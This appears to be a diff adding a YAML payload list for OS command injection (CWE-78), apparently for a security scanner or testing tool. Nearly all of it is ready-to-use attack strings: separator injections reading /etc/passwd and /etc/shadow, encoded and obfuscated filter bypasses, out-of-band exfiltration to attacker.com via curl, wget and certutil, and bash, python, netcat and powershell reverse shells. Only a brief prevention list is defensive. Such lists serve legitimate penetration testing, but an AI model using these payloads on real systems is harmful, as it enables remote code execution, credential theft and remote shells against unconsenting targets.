@@ -1,0 +1,181 @@
+# A05:2025 - Injection - OS Command Injection Payloads
+# CWE-78: Improper Neutralization of Special Elements used in an OS Command
+
+payload_category: "command-injection"
+owasp_2025: "A05"
+cwe: "CWE-78"
+severity: "CRITICAL"
+
+# ===== BASIC COMMAND INJECTION =====
+basic_linux:
+  semicolon:
+    - "; ls"
+    - "; ls -la"
+    - "; id"
+    - "; whoami"
+    - "; uname -a"
+    - "; cat /etc/passwd"
+    - "; cat /etc/shadow"
+
+  pipe:
+    - "| ls"
+    - "| id"
+    - "| whoami"
+    - "| cat /etc/passwd"
+    - "| uname -a"
+    - "| curl http://attacker.com"
+
+  ampersand:
+    - "& ls"
+    - "& id"
+    - "& whoami"
+    - "&& ls"
+    - "&& id"
+    - "&& whoami"
+    - "&& cat /etc/passwd"
+
+  backtick:
+    - "`ls`"
+    - "`id`"
+    - "`whoami`"
+    - "`cat /etc/passwd`"
+
+  command_substitution:
+    - "$(ls)"
+    - "$(id)"
+    - "$(whoami)"
+    - "$(cat /etc/passwd)"
+    - "$(curl http://attacker.com)"
+
+  newline:
+    - "%0als"
+    - "%0aid"
+    - "%0awhoami"
+    - "\nls"
+    - "\nid"
+
+basic_windows:
+  ampersand:
+    - "& dir"
+    - "& whoami"
+    - "& ipconfig"
+    - "& type C:\\windows\\win.ini"
+    - "& net user"
+    - "&& dir"
+    - "&& whoami"
+
+  pipe:
+    - "| dir"
+    - "| whoami"
+    - "| ipconfig"
+    - "| type C:\\windows\\win.ini"
+
+  semicolon:
+    - "; dir"
+    - "; whoami"
+
+# ===== BLIND COMMAND INJECTION =====
+blind_detection:
+  time_based_linux:
+    - "; sleep 5"
+    - "| sleep 5"
+    - "& sleep 5"
+    - "&& sleep 5"
+    - "$(sleep 5)"
+    - "`sleep 5`"
+    - "; ping -c 5 127.0.0.1"
+
+  time_based_windows:
+    - "& ping -n 5 127.0.0.1"
+    - "& timeout /t 5"
+    - "| ping -n 5 127.0.0.1"
+
+  out_of_band_linux:
+    - "; curl http://attacker.com/$(whoami)"
+    - "; wget http://attacker.com/$(id)"
+    - "; nslookup attacker.com"
+    - "| curl http://attacker.com"
+    - "$(nslookup $(whoami).attacker.com)"
+
+  out_of_band_windows:
+    - "& nslookup attacker.com"
+    - "& certutil -urlcache -split -f http://attacker.com/shell.exe"
+    - "& powershell -c Invoke-WebRequest http://attacker.com"
+
+# ===== FILTER BYPASS =====
+filter_bypass:
+  space_bypass:
+    - ";{ls,-la}"
+    - ";ls${IFS}/etc/passwd"
+    - ";ls$IFS/etc/passwd"
+    - ";ls%09/etc/passwd"
+    - ";cat</etc/passwd"
+    - ";{cat,/etc/passwd}"
+
+  keyword_bypass:
+    - ";wh''oami"
+    - ";wh\"\"oami"
+    - ";w\\h\\o\\a\\m\\i"
+    - ";/bin/c?t /etc/passwd"
+    - ";/bin/ca* /etc/passwd"
+    - ";c''at /etc/passwd"
+    - ";c\"\"at /etc/passwd"
+
+  encoding:
+    hex: ";$(printf '\\x77\\x68\\x6f\\x61\\x6d\\x69')"
+    base64: ";echo d2hvYW1p | base64 -d | sh"
+    octal: ";$(printf '\\167\\150\\157\\141\\155\\151')"
+
+  variable_bypass:
+    - ";a=wh;b=oami;$a$b"
+    - ";a=ca;b=t;$a$b /etc/passwd"
+    - ";${PATH%%[a-z]*}whoami"
+
+# ===== REVERSE SHELL =====
+reverse_shell:
+  bash:
+    - "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    - "; bash -c 'sh -i >& /dev/tcp/attacker.com/4444 0>&1'"
+  python:
+    - "; python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
+  netcat:
+    - "; nc -e /bin/sh attacker.com 4444"
+    - "; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f"
+  powershell:
+    - "& powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient('attacker.com',4444)"
+
+# ===== CONTEXT-SPECIFIC =====
+context_specific:
+  filename_parameter:
+    - "test.txt; whoami"
+    - "test.txt | id"
+    - "test.txt$(whoami)"
+
+  ip_address_parameter:
+    - "127.0.0.1; whoami"
+    - "127.0.0.1 | id"
+    - "127.0.0.1 && cat /etc/passwd"
+
+  url_parameter:
+    - "http://example.com; whoami"
+    - "http://example.com | id"
+    - "http://example.com$(whoami)"
+
+  email_parameter:
+    - "test@test.com; whoami"
+    - "test@$(whoami).com"
+
+prevention:
+  - "Never pass user input to OS commands"
+  - "Use language APIs instead of shell commands"
+  - "Input validation with strict whitelist"
+  - "Escape shell metacharacters"
+  - "Use parameterized commands (subprocess with list args)"
+  - "Sandbox command execution (Docker, chroot)"
+  - "Principle of least privilege"
+
+references:
+  - "OWASP Top 10:2025 A05"
+  - "CWE-78: OS Command Injection"
+  - "OWASP Command Injection"
+  - "PayloadsAllTheThings: Command Injection"
